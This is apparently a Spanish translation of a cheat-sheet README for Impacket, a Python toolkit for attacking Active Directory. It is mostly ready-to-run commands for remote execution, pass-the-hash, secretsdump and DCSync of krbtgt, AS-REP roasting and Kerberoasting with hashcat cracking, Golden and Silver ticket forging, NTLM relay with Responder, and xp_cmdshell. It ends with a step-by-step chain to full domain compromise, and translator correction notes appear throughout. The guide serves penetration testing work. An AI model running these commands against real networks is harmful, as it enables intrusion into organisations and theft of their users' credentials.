# 🐍 Impacket - Herramientas Python para ataques a Active Directory

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Herramientas Python para protocolos de red
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

---

## 📋 Índice

- [¿Qué es Impacket?](#-qué-es-impacket)
- [Instalación](#-instalación)
- [Ejecución remota](#-ejecución-remota)
- [Volcado de credenciales](#-volcado-de-credenciales)
- [Ataques a Kerberos](#-ataques-a-kerberos)
- [Ataques a SMB](#-ataques-a-smb)
- [Ataques a MSSQL](#-ataques-a-mssql)
- [Consultas LDAP/AD](#-consultas-ldapad)
- [Referencia rápida](#-referencia-rápida)

---

## 🎯 ¿Qué es Impacket?

**Impacket** es una colección de clases Python para trabajar con protocolos de red. Es fundamental para pruebas de ataque a Active Directory:

- 🎫 **Kerberos** - AS-REP roasting, Kerberoasting y ataques basados en tickets
- 💻 **Ejecución remota** - psexec, wmiexec, smbexec y atexec
- 🔓 **Volcado de credenciales** - secretsdump y DCSync
- 📁 **SMB** - Operaciones con archivos y retransmisión de autenticación (relay)
- 🗄️ **MSSQL** - Ataques a bases de datos

### Herramientas principales

| Herramienta | Descripción |
|------|-------------|
| **psexec.py** | Ejecución remota mediante SMB |
| **wmiexec.py** | Ejecución remota mediante WMI |
| **secretsdump.py** | Volcar credenciales y hashes |
| **GetNPUsers.py** | AS-REP roasting |
| **GetUserSPNs.py** | Kerberoasting |
| **ntlmrelayx.py** | Ataques de retransmisión NTLM |
| **smbclient.py** | Cliente SMB |
| **mssqlclient.py** | Cliente MSSQL |

---

## 🚀 Instalación

### Kali Linux

```bash
# Preinstalado en Kali
impacket-psexec --help

# O instalar y actualizar
pip3 install impacket
pip3 install impacket --upgrade
```

### Desde GitHub

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# O instalar en modo desarrollo
pip3 install -e .
```

### Comprobar la instalación

```bash
# Comprobar la instalación
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

> **Compatibilidad:** los ejecutables con prefijo `impacket-` son habituales en paquetes de distribuciones; otros métodos de instalación pueden proporcionar nombres distintos. Además, `impacket.__version__` no está definido en todas las versiones y puede producir un error; véase el [módulo oficial](https://github.com/fortra/impacket/blob/master/impacket/__init__.py).

## 💻 Ejecución remota

### psexec.py

```bash
# Con contraseña
impacket-psexec domain.local/user:password@10.10.10.10

# Con un hash NTLM (Pass-the-Hash)
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Administrador local
impacket-psexec administrator:password@10.10.10.10

# Ejecutar un comando
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# Seleccionar un recurso compartido concreto según el original
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

> **Corrección:** `-target-ip` especifica la IP de conexión; no selecciona un recurso compartido, aunque así lo describe el comentario anterior. La ejecución remota requiere también permisos y servicios compatibles. Consulta la [implementación oficial de psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py).

### wmiexec.py

```bash
# Más discreto que psexec, según el original
impacket-wmiexec domain.local/user:password@10.10.10.10

# Con un hash
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Ejecutar un comando
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# Sin salida (silencioso)
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

### smbexec.py

```bash
# Utiliza SMB para la ejecución
impacket-smbexec domain.local/user:password@10.10.10.10

# Con un hash
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Especificar el recurso compartido
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

### atexec.py

```bash
# Utiliza el Programador de tareas
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# Con un hash
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

### dcomexec.py

```bash
# Utiliza DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# Distintos objetos DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

## 🔓 Volcado de credenciales

### secretsdump.py

```bash
# Volcar desde un host remoto
impacket-secretsdump domain.local/user:password@10.10.10.10

# Volcar con un hash (PtH)
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Volcar desde un controlador de dominio (DCSync)
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# Realizar DCSync solo para un usuario concreto
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Solo hashes NTLM (sin claves de Kerberos)
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# Guardar la salida en un archivo
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

### Ataque DCSync

```bash
# DCSync completo (descrito como volcado de toda la base de AD en el original)
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# DCSync de un usuario concreto
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# DCSync de krbtgt (para un Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Formato de salida: user:RID:LM:NTLM:::
```

> **Alcance de DCSync:** requiere permisos de replicación adecuados; disponer de una contraseña válida no basta. `-just-dc` extrae material de credenciales del directorio, no equivale a copiar toda su base de datos y todos sus atributos.

### Desde archivos locales

```bash
# Desde NTDS.dit y SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Desde SAM y SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Desde SECURITY y SYSTEM (secretos LSA)
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

## 🎫 Ataques a Kerberos

### AS-REP Roasting (GetNPUsers.py)

```bash
# Buscar usuarios sin preautenticación
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# Con credenciales
impacket-GetNPUsers domain.local/user:password -request

# Con IP del controlador de dominio
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# Guardar la salida en un archivo
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# Formato para hashcat
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# Formato para john
impacket-GetNPUsers domain.local/user:password -request -format john
```

### Kerberoasting (GetUserSPNs.py)

```bash
# Buscar cuentas susceptibles de Kerberoasting
impacket-GetUserSPNs domain.local/user:password

# Solicitar tickets TGS
impacket-GetUserSPNs domain.local/user:password -request

# Guardar la salida en un archivo
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# IP del controlador de dominio
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# Con un hash
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

### Recuperación de contraseñas a partir de hashes de Kerberos

```bash
# AS-REP (modo 18200 de hashcat)
hashcat -m 18200 asrep.txt wordlist.txt

# TGS/Kerberoast (modo 13100 de hashcat)
hashcat -m 13100 kerberoast.txt wordlist.txt

# Con john
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

> **Tipo de cifrado:** los modos 18200 y 13100 de hashcat corresponden a formatos Kerberos concretos, no a cualquier AS-REP o TGS. Elige el modo que corresponda al tipo de cifrado y al formato real de la salida.

### getTGT.py

```bash
# Solicitar un TGT con contraseña
impacket-getTGT domain.local/user:password

# Solicitar un TGT con un hash
impacket-getTGT domain.local/user -hashes :NTLMHASH

# Solicitar un TGT con una clave AES
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# Se guarda en user.ccache
# Exportar para utilizarlo:
export KRB5CCNAME=user.ccache
```

### ticketer.py (Golden/Silver Ticket)

```bash
# Golden Ticket (ticket dorado)
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket (ticket plateado)
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# Utilizar el ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

> **Alcance de tickets:** el Silver Ticket del ejemplo se limita al SPN `MSSQLSvc/...`; no autoriza por sí solo el acceso SMB que necesita psexec. El comando final puede corresponder al Golden Ticket, no a cualquier ticket guardado en el mismo archivo. Véase la [implementación de ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py).

## 📁 Ataques a SMB

### smbclient.py

```bash
# Conectarse a un recurso compartido
impacket-smbclient domain.local/user:password@10.10.10.10

# Listar los recursos compartidos
# (dentro de smbclient)
shares

# Conectarse a un recurso compartido concreto
use SHARE_NAME

# Listar los archivos
ls

# Descargar un archivo
get filename

# Subir un archivo
put localfile

# Ejecutar un comando
# (si se dispone de escritura en un recurso compartido)
```

### smbserver.py

```bash
# Iniciar un servidor SMB (para extraer datos)
impacket-smbserver share /tmp/share

# Con autenticación
impacket-smbserver share /tmp/share -username user -password pass

# Compatibilidad con SMB2
impacket-smbserver share /tmp/share -smb2support
```

### ntlmrelayx.py

```bash
# Relay básico
impacket-ntlmrelayx -tf targets.txt

# Relay hacia SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Realizar relay y ejecutar un comando
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# Volcar SAM durante el relay
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Relay hacia LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local

# Con Responder:
# 1. Editar Responder.conf y establecer SMB = Off, HTTP = Off
# 2. Ejecutar: responder -I eth0
# 3. Ejecutar: impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

<a id="-ataques-a-mssql"></a>
## 🗄️ Ataques a MSSQL

### mssqlclient.py

```bash
# Conectarse con autenticación de Windows
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# Conectarse con autenticación SQL
impacket-mssqlclient sa:password@10.10.10.10

# Con un hash
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# Conectarse a una base de datos concreta
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

### Comandos de MSSQL

```sql
-- Activar xp_cmdshell
enable_xp_cmdshell

-- Ejecutar un comando
xp_cmdshell whoami

-- Consulta SQL
SELECT * FROM master.sys.databases

-- Leer un archivo
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

> **Consola de MSSQL:** `enable_xp_cmdshell` y la forma abreviada `xp_cmdshell whoami` son comandos auxiliares del cliente interactivo, no sentencias T-SQL independientes. Su funcionamiento y la lectura de archivos dependen de los permisos de SQL Server y del servicio.

## 📂 Consultas LDAP/AD

### GetADUsers.py

```bash
# Listar todos los usuarios
impacket-GetADUsers domain.local/user:password -all

# Controlador de dominio concreto
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# Con un hash
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

### lookupsid.py

```bash
# Enumerar usuarios mediante prueba de SID por fuerza bruta
impacket-lookupsid domain.local/user:password@10.10.10.10

# Especificar el rango de SID
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

### findDelegation.py

```bash
# Buscar configuraciones de delegación
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

## 📊 Referencia rápida

### Opciones de autenticación

| Opción | Descripción |
|--------|-------------|
| `user:password` | Autenticación con contraseña |
| `-hashes :NTLM` | Hash NTLM (Pass-the-Hash) |
| `-hashes LM:NTLM` | Hash LM:NTLM |
| `-aesKey KEY` | Clave AES256 |
| `-k -no-pass` | Kerberos con caché ccache |

> **Clave AES:** la descripción AES256 reproduce el original; las herramientas compatibles también pueden admitir AES128 según la clave y el tipo de cifrado. Véase la [opción oficial de ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py).

### Opciones habituales

| Opción | Descripción |
|--------|-------------|
| `-dc-ip IP` | IP del controlador de dominio |
| `-target-ip IP` | IP del objetivo |
| `-debug` | Activar la salida de depuración |

### Resumen de ejecución remota

| Herramienta | Método | Discreción |
|------|--------|---------|
| psexec.py | SMB y servicio | Baja |
| wmiexec.py | WMI | Media |
| smbexec.py | SMB | Baja |
| atexec.py | Programador de tareas | Alta |
| dcomexec.py | DCOM | Media |

> **Interpretación de la discreción:** los niveles de la tabla son orientativos. Todos estos mecanismos pueden generar artefactos y eventos; la detectabilidad depende de la configuración y supervisión del entorno. Los archivos `asrep.txt` y `kerberoast.txt` del flujo siguiente deben haberse generado y guardado previamente.

### Flujo de ataque

```bash
# 1. Enumerar usuarios (AS-REP roasting)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. Realizar Kerberoasting
impacket-GetUserSPNs domain.local/user:password -request

# 3. Recuperar contraseñas a partir de los hashes
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. Utilizar PtH o la contraseña
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. Volcar las credenciales
impacket-secretsdump domain.local/admin:password@DC01

# 6. Realizar DCSync para todos los hashes
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

## 📚 Recursos

- [Impacket GitHub](https://github.com/fortra/impacket)
- [Ejemplos de Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [Wiki](https://github.com/fortra/impacket/wiki)

### Guías rápidas relacionadas
- [BloodHound](../../BloodHound/translations/README.es.md)
- [Mimikatz](../../Mimikatz/translations/README.es.md)
- [Hashcat](../../Hashcat/translations/README.es.md)

---

<p align="center">
  <b>🐍 ¡Domina las pruebas de ataque a AD con Python!</b><br>
  <i>Impacket - Herramientas esenciales para pentesters</i>
</p>
